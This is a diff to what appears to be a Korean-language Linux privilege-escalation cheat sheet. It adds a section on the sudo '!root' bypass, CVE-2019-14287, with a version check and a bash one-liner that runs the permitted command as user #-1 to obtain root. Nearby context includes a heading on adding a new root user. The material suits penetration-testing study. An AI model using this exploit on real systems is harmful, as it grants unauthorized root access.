@@ -64,7 +64,19 @@ Shebang의 "간접 호출"은 감지 못함 (설계상 버그)
 </details>
 
 ---
+<details>
+  <summary><strong>Sudo !root bypass(CVE-2019-14287)</strong></summary>
 
+- `sudo -l`를 실행하여 `!root`권한으로 실행이 되는지 확인.
+- version < 1.8.28
+```bash
+varSudo=$(sudo -l | \grep '(' | cut -d/ -f2-)
+sudo -u#-1 /$varSudo
+```
+  
+</details>
+
+---
 ## Add New Root User
 ```bash
 # 패스워드 해시 생성
